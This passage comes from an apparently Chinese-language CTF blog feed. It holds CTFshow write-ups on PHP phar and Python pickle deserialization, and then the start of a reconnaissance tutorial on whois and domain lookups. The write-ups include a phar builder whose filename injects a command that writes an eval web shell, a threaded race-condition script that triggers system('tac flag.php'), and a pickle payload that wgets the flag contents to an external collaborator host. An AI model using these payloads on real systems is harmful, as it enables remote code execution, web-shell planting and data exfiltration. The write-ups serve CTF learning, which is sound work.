punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evilfile</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>__destruct()</code>Âä†‰∫ÜÊù°‰ª∂Ôºå‰ΩÜÊòØ<code>admin</code>‰∏çÂèØÊéß</p><p><a href="https://xz.aliyun.com/t/2715?time__1311=n4+xni0=G=GQ=DKi==Ds0ffrYGCSDBmiDchrYD">ÂàùÊé¢phar:&#x2F;&#x2F;</a></p><p>È¶ñÂÖàÊûÑÈÄ† <code>phar</code> ÁöÑÊñá‰ª∂ÔºåÂ∞Ü <code>filter</code> Â≠òÂÇ®Âú® <code>meta-data</code> ‰∏≠‰ª•Â§áÂèçÂ∫èÂàóÂåñ„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">filter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a;echo '&lt;?php @eval(\$_POST[1]); ?>' > shell.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payload.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ËÆæÁΩÆstub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂</span><span class="token comment">//Á≠æÂêçËá™Âä®ËÆ°ÁÆó</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"done."</span><span class="token punctuation">;</span></span></code></pre><p>ÁÑ∂ÂêéÂõ†‰∏∫Êñá‰ª∂ÂêçÂä†‰∏ä <code>/var/www/html/</code> Âêé <code>unlink</code> ÁöÑÂèÇÊï∞Â∞±‰ºöÊúâ‰∏§ÈÅçË∑ØÂæÑÔºåÂà†‰∏çÊéâÔºåÂ∞±ÂèØ‰ª•ÊåÅ‰πÖÂåñ‰∏ä‰º†Êñá‰ª∂‰∫ÜÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÈÄöËøáÊù°‰ª∂Á´û‰∫âÂéªÂèçÂ∫èÂàóÂåñËøô‰∏™ <code>phar</code>„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>target <span class="token operator">=</span> <span class="token string">"/var/www/html/d.phar"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    payload <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">"phar://d.phar/test"</span>_ <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/?fn=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p>Êù°‰ª∂Á´û‰∫â</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl<span class="token operator">=</span><span class="token string">"https://39afeb37-98e3-49cc-9a59-ba48da61ff09.challenge.ctf.show/"</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"CTFshow\php-unserialize\payload.phar"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#‰∏ä‰º†1.pharÔºåÂÜÖÂÆπÊòØÊú¨Âú∞Êñá‰ª∂Ôºöphar.phar</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=d.phar"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#Âà©Áî®Êù°‰ª∂Á´û‰∫âÔºåÂ∞ùËØïphar://ÂèçÂ∫èÂàóÂåñ1.pharÔºå1.pharÊ≤°Ë¢´Âà†Èô§Â∞±ËÉΩË¢´ÂèçÂ∫èÂàóÂåñÔºåÂõ†ËÄåÂ∞±ËÉΩÊâßË°åsystem()ÂáΩÊï∞‰ªéËÄåÊâßË°åÊàë‰ª¨ÁöÑÂëΩ‰ª§</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=phar://d.phar/test"</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token string">"1=system('tac flag.php)"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload<span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="web277-pythonÂèçÂ∫èÂàóÂåñ"><a href="#web277-pythonÂèçÂ∫èÂàóÂåñ" class="headerlink" title="web277(pythonÂèçÂ∫èÂàóÂåñ)"></a>web277(pythonÂèçÂ∫èÂàóÂåñ)</h4><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Python ÂèçÂ∫èÂàóÂåñÊºèÊ¥û</a></p><p>Âà©Áî®burpÁöÑCollaboratorÂ§ñÂ∏¶</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">hsad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wget npgr48shkll6h9ye92srk1po7fd71xpm.oastify.com/?a=`tac flag`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>hsad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="web277.png" loading="lazy"></p><h4 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h4><p>Âêå <code>web277</code>ÔºåÁ¶ÅÁî®‰∫Ü <code>os.system</code> ‰ΩÜ‰∏çÂΩ±Âìç <code>os.popen</code>„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php-unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰ø°ÊÅØÊî∂ÈõÜ</title>
      <link href="/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h4 id="‰ø°ÊÅØÊî∂ÈõÜÂÜÖÂÆπ"><a href="#‰ø°ÊÅØÊî∂ÈõÜÂÜÖÂÆπ" class="headerlink" title="‰ø°ÊÅØÊî∂ÈõÜÂÜÖÂÆπ"></a>‰ø°ÊÅØÊî∂ÈõÜÂÜÖÂÆπ</h4><p>Âú®ÂàíÂÆö‰∫ÜÊµãËØïËåÉÂõ¥‰πãÂêéÔºåÂ∞±ÈúÄË¶ÅËøõÂÖ•‰ø°ÊÅØÊî∂ÈõÜÈò∂ÊÆµ„ÄÇÂú®Ëøô‰∏™Èò∂ÊÆµÔºåÊ∏óÈÄè‰∫∫ÂëòÈúÄË¶Å‰ΩøÁî®ÂêÑÁßçÂÖ¨ÂºÄËµÑÊ∫êÂ∞ΩÂèØËÉΩÂú∞Ëé∑ÂèñÊµãËØïÁõÆÊ†áÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ„ÄÇ‰ªñ‰ª¨ÊêúÈõÜ‰ø°ÊÅØÁöÑ‰∫íËÅîÁΩëÊ∏†ÈÅì‰∏ªË¶ÅÊúâÔºöËÆ∫Âùõ&#x2F;ÂÖ¨ÂëäÊùø&#x2F;Êñ∞ÈóªÁªÑ&#x2F;Â™í‰ΩìÊñáÁ´†&#x2F;ÂçöÂÆ¢&#x2F;Á§æ‰∫§ÁΩëÁªú&#x2F;github&#x2F;ÂÖ∂‰ªñÂïÜ‰∏öÊàñÈùûÂïÜ‰∏öÊÄßÁöÑÁΩëÁ´ô„ÄÇÊ≠§Â§ñÔºå‰ªñ‰ª¨‰πüÂèØ‰ª•ÂÄüÂä©ÂêÑÁßçÊêúÁ¥¢ÂºïÊìé‰∏≠Ëé∑ÂèñÁõ∏ÂÖ≥Êï∞ÊçÆÔºåÂ¶ÇË∞∑Ê≠å„ÄÅÈõÖËôé„ÄÅMSNÂøÖÂ∫î„ÄÅÁôæÂ∫¶Á≠â„ÄÇÊî∂ÈõÜÁöÑ‰ø°ÊÅØ‰∏ªË¶ÅÂåÖÊã¨:</p><p>Ôºà1ÔºâÊî∂ÈõÜÁõÆÊ†áÁΩëÁ´ôÊúçÂä°Âô®‰ø°ÊÅØÔºöÂüüÂêç„ÄÅÂ≠êÂüüÂêç„ÄÅCNAME„ÄÅcdn„ÄÅÁúüÂÆûIP„ÄÅÁ≥ªÁªüÁ±ªÂûã„ÄÅÁâàÊú¨Á≠âÔºõ</p><p>Ôºà2ÔºâËØÜÂà´Âπ∂Êî∂ÈõÜÁõÆÊ†áÁΩëÁ´ôÊåáÁ∫π‰ø°ÊÅØÔºöCMS„ÄÅ‰∏≠Èó¥‰ª∂„ÄÅÁΩëÈ°µÁºñÁ®ãËØ≠Ë®ÄÁ≠âÂèäÂÖ∂ÈÄöÁî®ÊºèÊ¥ûË∞ÉÊü•Êî∂ÈõÜÔºõ</p><p>Ôºà3ÔºâÊâ´ÊèèÂπ∂Êî∂ÈõÜÁõÆÊ†áÁΩëÁ´ôÁõÆÂΩïÁªìÊûÑÔºö‰∏Ä‰∫õÊñá‰ª∂ÂèØ‰ª•ËÆøÈóÆËé∑Âæó‰ø°ÊÅØ„ÄÅÂêéÂè∞ÁÆ°ÁêÜÈ°µÈù¢‰ΩçÁΩÆ„ÄÅÊó•Âøó‰ΩçÁΩÆÁ≠âÔºõ</p><p>Ôºà4ÔºâÁΩëÁ´ôÁöÑÊïèÊÑü‰ø°ÊÅØÔºö</p><p>whois‰ø°ÊÅØ„ÄÅÂßìÂêç„ÄÅÂ§áÊ°à„ÄÅÈÇÆÁÆ±„ÄÅÁîµËØùÂèçÊü•ÔºàÈÇÆÁÆ±‰∏¢Á§æÂ∑•Â∫ìÔºåÁ§æÂ∑•ÂáÜÂ§áÁ≠âÔºâÔºõ<br>Âº±Âè£‰ª§Êâ´Êèè„ÄÅÂØÜÁ†ÅÁàÜÁ†¥Á≠âÔºàÂ¶ÇÈíàÂØπÁ≥ªÁªüÁÆ°ÁêÜÂëò„ÄÅÁΩëÁ´ôÂêéÂè∞ÁÆ°ÁêÜÂëò„ÄÅÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÂëòÁ≠âÔºâÔºõ<br>ÁΩëÁ´ôÊ∫êÁ†ÅÊòØÂê¶Ê≥ÑÈú≤Á≠âÔºåÂ¶ÇgithubÊ∫êÁ†Å„ÄÇ<br>Ôºà5ÔºâÊî∂ÈõÜÁõÆÊ†áÊúçÂä°Âô®‰∏ªÊú∫Á´ØÂè£‰ø°ÊÅØÔºö‰∏çÂêåÁ´ØÂè£Êèê‰æõ‰∏çÂêåÁöÑÊîªÂáªÊÄùË∑ØÂíåÊñπÂêëÔºõ</p><p>Ôºà6ÔºâÁΩëÁªúÈò≤Êä§‰ø°ÊÅØÔºöÁΩëÁªúËæπÁïåËÆæÂ§áÊàñÁΩëÁªúËäÇÁÇπËÆæÂ§áÔºåÂ¶ÇÊúâÊ≤°ÊúâÈò≤ÁÅ´Â¢ôÔºåÊúâÊ≤°ÊúâIPS„ÄÅIDSÊàñWAFÔºåÁΩëÁªúË°å‰∏∫ÁÆ°ÁêÜÔºåÂÖ®ÊµÅÈáèÂàÜÊûê„ÄÇ</p><p>Êî∂ÈõÜÁöÑ‰ø°ÊÅØË∂äÂ§öÔºåÊ∏óÈÄèÊµãËØïÊàêÂäüÁöÑÊ¶ÇÁéáË∂äÈ´ò„ÄÇ<br>Âú®‰ø°ÊÅØÊî∂ÈõÜ‰∏≠ÔºåÊúÄ‰∏ªË¶ÅÁöÑÂ∞±ÊòØÊî∂ÈõÜÊúçÂä°Âô®ÁöÑÈÖçÁΩÆ‰ø°ÊÅØÂíåÁΩëÁ´ôÁöÑÊïèÊÑü‰ø°ÊÅØÔºåÂÖ∂‰∏≠ÂåÖÊã¨ÂüüÂêçÂèäÂ≠êÂüüÂêç‰ø°ÊÅØ„ÄÅÁõÆÊ†áÁΩëÁ´ôÁ≥ªÁªü„ÄÅCMSÊåáÁ∫π„ÄÅÁõÆÊ†áÁΩëÁ´ôÁúüÂÆûIP „ÄÅÂºÄÊîæÁöÑÁ´ØÂè£Á≠â„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂè™Ë¶ÅÊòØ‰∏éÁõÆÊ†áÁΩëÁ´ôÁõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØÔºåÊàë‰ª¨ÈÉΩÂ∫îËØ•ÂéªÂ∞ΩÈáèÊêúÈõÜ„ÄÇ</p><h4 id="ÂüüÂêçÁõ∏ÂÖ≥‰ø°ÊÅØ"><a href="#ÂüüÂêçÁõ∏ÂÖ≥‰ø°ÊÅØ" class="headerlink" title="ÂüüÂêçÁõ∏ÂÖ≥‰ø°ÊÅØ"></a>ÂüüÂêçÁõ∏ÂÖ≥‰ø°ÊÅØ</h4><p>Áü•ÈÅìÁõÆÊ†áÁöÑÂüüÂêç‰πãÂêéÔºåÊàë‰ª¨Ë¶ÅÂÅöÁöÑÁ¨¨‰∏Ä‰ª∂‰∫ãÂ∞±ÊòØËé∑ÂèñÂüüÂêçÁöÑÊ≥®ÂÜå‰ø°ÊÅØÔºåÊ≥®ÊÑèÂÖ≥Ê≥®ËØ•ÂüüÂêçÁöÑÊ≥®ÂÜåÂïÜÂíåÊ≥®ÂÜå‰∫∫ÁöÑËÅîÁ≥ªÊñπÂºèÔºàÁîµËØùÂíåÈÇÆÁÆ±ÔºâÁ≠â‰ø°ÊÅØ„ÄÇ</p><h5 id="ÂüüÂêçÂàÜÁ±ª"><a href="#ÂüüÂêçÂàÜÁ±ª" class="headerlink" title="ÂüüÂêçÂàÜÁ±ª"></a>ÂüüÂêçÂàÜÁ±ª</h5><p>ÂõΩÈôÖÂüüÂêçÔºö.com(ÂïÜ‰∏öÂÖ¨Âè∏);:net(ÁΩëÁªúÊúçÂä°):.org(ÁªÑÁªáÂçè‰ºöÁ≠â);.gov(ÊîøÂ∫úÈÉ®Èó®);.edu(ÊïôËÇ≤Êú∫ÊûÑ);.mil(ÂÜõ‰∫ãÈ¢ÜÂüü);.int(ÂõΩÈôÖÁªÑÁªá)</p><p>ÂõΩÂà´ÂüüÂêçÔºö.CN‰ª£Ë°®‰∏≠ÂõΩÔºå.UK‰ª£Ë°®Ëã±ÂõΩÔºå.US‰ª£Ë°®ÁæéÂõΩ„ÄÄ</p><p>Êñ∞È°∂Á∫ßÂüüÂêçÔºöbiz,infoÔºånameÔºåpro, aero, coop, museum‚Ä¶</p><h5 id="ÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè"><a href="#ÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè" class="headerlink" title="ÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè"></a>ÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè</h5><h6 id="whoisÊü•ËØ¢"><a href="#whoisÊü•ËØ¢" class="headerlink" title="whoisÊü•ËØ¢"></a>whoisÊü•ËØ¢</h6><p>WhoisÊòØ‰∏Ä‰∏™Ê†áÂáÜÁöÑ‰∫íËÅîÁΩëÂçèËÆÆÔºå ÂèØÁî®‰∫éÊî∂ÈõÜÂüüÂêçÊ≥®ÂÜå‰ø°ÊÅØÔºåÊ≥®ÂÜåÁöÑÂüüÂêç„ÄÅIPÂú∞ÂùÄÁ≠â‰ø°ÊÅØ„ÄÇÁÆÄÂçïÊù•ËØ¥Ôºå WhoisÂ∞±ÊòØ‰∏Ä‰∏™Áî®‰∫éÊü•ËØ¢ÂüüÂêçÊòØÂê¶</p><p>Â∑±Ë¢´Ê≥®ÂÜå‰ª•ÂèäÊ≥®ÂÜåÂüüÂêçÁöÑËØ¶ÁªÜ‰ø°ÊÅØÁöÑÊï∞ÊçÆÂ∫ìÔºàÂ¶ÇÂüüÂêçÊâÄÊúâ‰∫∫„ÄÅÂüüÂêçÊ≥®ÂÜåÂïÜÔºâ„ÄÇ</p><p>Âú®WhoisÊü•ËØ¢‰∏≠ÔºåÂæóÂà∞Ê≥®ÂÜå‰∫∫ÁöÑÂßìÂêçÂíåÈÇÆÁÆ±‰ø°ÊÅØÈÄöÂ∏∏ÂØπÊµãËØï‰∏™‰∫∫Á´ôÁÇπÈùûÂ∏∏ÊúâÁî®ÔºåÂõ†‰∏∫Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊêúÁ¥¢ÂºïÊìéÂíåÁ§æ‰∫§ÁΩëÁªúÊåñÊéòÂá∫ÂüüÂêçÊâÄÊúâ‰∫∫</p><p>ÁöÑÂæàÂ§ö‰ø°ÊÅØ„ÄÇÂØπ‰∏≠Â∞èÁ´ôÁÇπËÄåË®ÄÔºåÂüüÂêçÊâÄÊúâ‰∫∫ÂæÄÂæÄÂ∞±ÊòØÁÆ°ÁêÜÂëò„ÄÇ</p><ul><li><strong>KaliÁ≥ªÁªü</strong>ÔºöÂú®KaliÁ≥ªÁªü‰∏≠Ôºå Whois Â∑±ÁªèÈªòËÆ§ÂÆâË£ÖÔºåÂè™ÈúÄËæìÂÖ•Ë¶ÅÊü•ËØ¢ÁöÑÂüüÂêçÂç≥ÂèØÔºå‰ª£Á†Å‰∏∫<code>whois+ÂüüÂêç</code>Ôºà‰∏ÄËà¨ÂüüÂêç‰∏çÂåÖÂê´‰∏ªÊú∫ÂêçÔºåÂ¶Ç</li></ul><p>¬∑baidu.comÔºâ„ÄÇÊ≥®ÊÑèÔºåKaliÁ≥ªÁªüÈúÄËøûÊé•ÁúüÂÆûÁΩëÁªúÔºåËÉΩ‰∏äÁΩë„ÄÇ</p><ul><li><strong><a href="https://whois.chinaz.com/">Á´ôÈïø‰πãÂÆ∂</a></strong></li><li><strong><a href="https://whois.aliyun.com/">ÈòøÈáå‰∫ëÊü•ËØ¢</a></strong></li></ul><h6 id="ÂèçÊü•"><a href="#ÂèçÊü•" class="headerlink" title="ÂèçÊü•"></a>ÂèçÊü•</h6><p><a href="https://whois.chinaz.com/reverse/">ÈÇÆÁÆ±ÂèçÊü• Ê≥®ÂÜå‰∫∫ÂèçÊü• ÁîµËØùÂèçÊü•</a></p><h6 id="Â§áÊ°à‰ø°ÊÅØÊü•ËØ¢"><a href="#Â§áÊ°à‰ø°ÊÅØÊü•ËØ¢" class="headerlink" title="Â§áÊ°à‰ø°ÊÅØÊü•ËØ¢"></a>Â§áÊ°à‰ø°ÊÅØÊü•ËØ¢</h6><ul><li><strong><a href="https://www.beianx.cn/">ICPÂ§áÊ°àÊü•ËØ¢ÁΩë</a></strong></li><li><strong><a href="http://www.tianyancha.como/">Â§©ÁúºÊü•</a></strong></li><li><strong><a href="https://beian.miit.gov.cn/?wm=gwo#/Integrated/index">ICP&#x2F;IPÂú∞ÂùÄ&#x2F;ÂüüÂêç‰ø°ÊÅØÂ§áÊ°àÁÆ°ÁêÜÁ≥ªÁªü</a></strong></li></ul><h5 id="Â≠êÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè"><a href="#Â≠êÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè" class="headerlink" title="Â≠êÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè"></a>Â≠êÂüüÂêç‰ø°ÊÅØÊü•ËØ¢ÊñπÂºè</h5><p>Â≠êÂüüÂêç‰πüÂ∞±ÊòØ‰∫åÁ∫ßÂüüÂêçÔºå ÊòØÊåáÈ°∂Á∫ßÂüüÂêç‰∏ãÁöÑÂüüÂêç„ÄÇÂÅáËÆæÊàë‰ª¨ÁöÑÁõÆÊ†áÁΩëÁªúËßÑÊ®°ÊØîËæÉÂ§ßÔºåÁõ¥Êé•‰ªé‰∏ªÂüüÂÖ•ÊâãÊòæÁÑ∂ÊòØÂæà‰∏çÁêÜÊô∫ÁöÑÔºå Âõ†‰∏∫ÂØπ‰∫éËøôÁßç</p><p>ËßÑÊ®°ÁöÑÁõÆÊ†áÔºå 